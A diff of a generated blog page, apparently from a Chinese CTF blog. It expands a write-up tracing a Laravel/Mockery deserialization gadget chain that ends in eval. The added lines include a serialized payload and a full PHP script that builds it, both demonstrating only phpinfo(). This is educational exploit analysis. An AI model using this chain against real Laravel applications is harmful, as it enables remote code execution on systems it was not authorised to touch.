@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">917</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.6k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -412,9 +412,15 @@ height:50vh;
 <p>然后再用<code>composer</code>去运行上面的创建项目语句，如果结果如上所说，就基本成功<br>最后再访问一下<code>http://localhost/laravel/public/index.php</code>（具体路径根据自己的目录而定，出现下图的话，恭喜你，<code>laravel</code>框架成功搭建<br><img src="/assets/laravel/3.png" alt=""></p>
 <h3 id="mockery组件反序列化分析"><a href="#mockery组件反序列化分析" class="headerlink" title="mockery组件反序列化分析"></a>mockery组件反序列化分析</h3><p>昨天ph牛在小密圈发了之前<code>code breaking lumenserial</code>的官方exp，遂学习一波<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:40:"Illuminate\Broadcasting\PendingBroadcast":2:&#123;S:9:"\00*\00events";O:25:"Illuminate\Bus\Dispatcher":1:&#123;S:16:"\00*\00queueResolver";a:2:&#123;i:0;O:25:"Mockery\Loader\EvalLoader":0:&#123;&#125;i:1;S:4:"load";&#125;&#125;S:8:"\00*\00event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:&#123;S:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:&#123;S:9:"\00*\00config";O:35:"Mockery\Generator\MockConfiguration":1:&#123;S:7:"\00*\00name";S:7:"abcdefg";&#125;S:7:"\00*\00code";S:25:"&lt;?php phpinfo(); exit; ?&gt;";&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>入口还是那个熟悉的配方，嗯，就是<code>PendingBroadcasting</code>那个类<br>在<code>Illuminate\Broadcasting\PendingBroadcasting.php</code>里面有个<code>__destruct</code>函数，没错，又是这个函数…….<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//        $this-&gt;events-&gt;dispatch(protected $this-&gt;event);</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>而这两个参数<code>event</code>和<code>events</code>，都是可以控制的，再找一下别的类有没有<code>dispatch</code>这个方法，ph大师傅给了<code>Illuminate\Bus\Dispatcher</code>里面的<code>dispatch</code>方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//        if (protected $this-&gt;queueResolver &amp;&amp; instanceof $this-&gt;commandShouldBeQueued($command))</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue($command);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchNow($command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>先看前面的<code>if</code>有两个条件，第一个是<code>$this-&gt;queueResolver</code>，另一个则是<code>$this-&gt;commandShouldBeQueued($command)</code>，而<code>queueResolver</code>这个参数是可控的，跟过去<code>commandShouldBeQueued</code>方法看一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>而这两个参数<code>$this-&gt;event</code>和<code>$this-&gt;events</code>，都是可以控制的，再找一下别的类有没有<code>dispatch</code>这个方法，ph大师傅给了<code>Illuminate\Bus\Dispatcher</code>里面的<code>dispatch</code>方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//        if (protected $this-&gt;queueResolver &amp;&amp; instanceof $this-&gt;commandShouldBeQueued($command))</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue($command);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchNow($command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>先看前面的<code>if</code>有两个条件，第一个是<code>$this-&gt;queueResolver</code>，另一个则是<code>$this-&gt;commandShouldBeQueued($command)</code>，而<code>$this-&gt;queueResolver</code>这个参数是可控的，跟过去<code>commandShouldBeQueued</code>方法看一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p><code>ShouldQueue</code>是一个接口，所以这个只要满足继承了这个接口就行了，这里ph牛用了<code>Illuminate\Broadcasting\BroadcastEvent</code>这个类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> <span class="keyword">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>所以这两个条件都是能满足的，再跟下去<code>dispatchToQueue</code>函数看一下有什么<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $connection = $command-&gt;connection ?? <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">//        $queue = call_user_func(protected $this-&gt;queueResolver, $command-&gt;connnetction);</span></span><br><span class="line">    $queue = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, $connection);</span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>很愉快地看到了<code>call_user_func</code>，包含两个参数，<code>$this-&gt;queueResolver</code>就是上面的<code>dispatch</code>的那个参数，而<code>$connection</code>是由传参<code>$command</code>决定的<br>再接着就是找个能调用的方法了，这里ph牛给了个<code>Mockery\Loader\EvalLoader</code>类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvalLoader</span> <span class="keyword">implements</span> <span class="title">Loader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">(MockDefinition $definition)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (class_exists($definition-&gt;getClassName(), <span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"?&gt;"</span> . $definition-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个类很简短，里面只有个<code>load</code>方法，还有个<code>eval</code>，所以接下来我们就是要想办法让<code>class_exists($definition-&gt;getClassName(), false)</code>返回false，控制<code>$definition-&gt;getCode()</code>这个值啦<br>先跟过去看<code>getClassName</code>方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockDefinition</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $config;</span><br><span class="line">    <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现<code>getClassName</code>调用的是<code>getName</code>，继续跟过去，代码只放关键部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到<code>getName</code>会返回<code>$name</code>，而这个参数是可控的，至此，我们已经可以成功控制<code>class_exists($definition-&gt;getClassName(), false)</code>的返回值了<br>最后看一下<code>$definition-&gt;getCode()</code>方法的返回值，上面贴的代码可以看到，返回的<code>code</code>也是可控的，所以pop已经很清晰了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用PendingBroadcast的__destruct方法调用Dispatcher的dispatch方法</span><br><span class="line">利用BroadcastEvent满足$this-&gt;commandShouldBeQueued($command)这个条件，接着调用dispatchToQueue方法</span><br><span class="line">利用dispatchToQueue方法去调用EvalLoader的load方法</span><br><span class="line">控制MockDefinition和MockConfiguration的变量使load方法的if条件返回false，最后成功执行eval</span><br></pre></td></tr></table></figure></p>
+<p>exp如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">event</span>;</span><br><span class="line">        <span class="keyword">protected</span> $events;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($event, $events)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        function __destruct()</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            $this-&gt;events-&gt;dispatch($this-&gt;event);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        public function dispatch($command)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">////        if (protected $this-&gt;queueResolver &amp;&amp; instanceof $this-&gt;commandShouldBeQueued($command))</span></span><br><span class="line"><span class="comment">//            if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123;</span></span><br><span class="line"><span class="comment">//                return $this-&gt;dispatchToQueue($command);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            return $this-&gt;dispatchNow($command);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">BroadcastEvent</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">load</span>(<span class="title">MockDefinition</span> $<span class="title">definition</span>)</span><br><span class="line">        &#123;</span><br><span class="line">//            <span class="title">if</span> (<span class="title">class_exists</span>($<span class="title">definition</span>-&gt;<span class="title">getClassName</span>(), <span class="title">false</span>)) &#123;</span><br><span class="line">//                <span class="title">return</span>;</span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">/*            eval("?&gt;" . $definition-&gt;getCode());*/</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">"abcd"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    $<span class="title">MockConfiguration</span> = <span class="title">new</span> <span class="title">Mockery</span>\<span class="title">Generator</span>\<span class="title">MockConfiguration</span>();</span><br><span class="line">    $MockDefinition = <span class="keyword">new</span> Mockery\Generator\MockDefinition($MockConfiguration);</span><br><span class="line">    $EvalLoader = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    $queueResolver = [$EvalLoader,<span class="string">"load"</span>];</span><br><span class="line">    $Dispatcher = <span class="keyword">new</span> Illuminate\Bus\Dispatcher($queueResolver);</span><br><span class="line">    $BroadcastEvent = <span class="keyword">new</span> Illuminate\Broadcasting\BroadcastEvent($MockDefinition);</span><br><span class="line">    $PendingBroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($Dispatcher, $BroadcastEvent);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($PendingBroadcast));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 
     </article>
     <!-- license  -->
@@ -1436,58 +1442,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 57
@@ -1586,22 +1540,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/2019西湖论剑web-writeup/">2019西湖论剑web writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/2019-0ctf-wp/">2019 0ctf wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
         </li>
     
     
@@ -1636,12 +1590,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/">imap_open()实现远程任意代码执行（CVE-2018-19518）</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/2019安恒杯二月赛/">2019安恒杯二月赛</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/2019安恒杯二月赛/">2019安恒杯二月赛</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/">imap_open()实现远程任意代码执行（CVE-2018-19518）</a>
         </li>
     
     
@@ -1656,12 +1610,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
         </li>
     
     
@@ -1750,12 +1704,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
         </li>
     
     
@@ -1803,9 +1757,9 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="安恒杯"><span class="iconfont-archer">&#xe606;</span>安恒杯</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="安恒杯"><span class="iconfont-archer">&#xe606;</span>安恒杯</span>
     
         <span class="sidebar-tag-name" data-tags="MongoDB"><span class="iconfont-archer">&#xe606;</span>MongoDB</span>
     
@@ -1815,8 +1769,6 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
     
-        <span class="sidebar-tag-name" data-tags="laravel"><span class="iconfont-archer">&#xe606;</span>laravel</span>
-    
         <span class="sidebar-tag-name" data-tags="javascript"><span class="iconfont-archer">&#xe606;</span>javascript</span>
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
@@ -1825,13 +1777,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="web+re"><span class="iconfont-archer">&#xe606;</span>web+re</span>
     
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
+    
         <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
     
-        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
-    
         <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="laravel"><span class="iconfont-archer">&#xe606;</span>laravel</span>
     
         <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
     
@@ -1880,9 +1834,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="web/crypto"><span class="iconfont-archer">&#xe60a;</span>web/crypto</span>
     
-        <span class="sidebar-category-name" data-categories="web/crypto/misc"><span class="iconfont-archer">&#xe60a;</span>web/crypto/misc</span>
-    
         <span class="sidebar-category-name" data-categories="web/misc"><span class="iconfont-archer">&#xe60a;</span>web/misc</span>
+    
+        <span class="sidebar-category-name" data-categories="web/crypto/misc"><span class="iconfont-archer">&#xe60a;</span>web/crypto/misc</span>
     
         <span class="sidebar-category-name" data-categories="web/misc/crypto"><span class="iconfont-archer">&#xe60a;</span>web/misc/crypto</span>
     
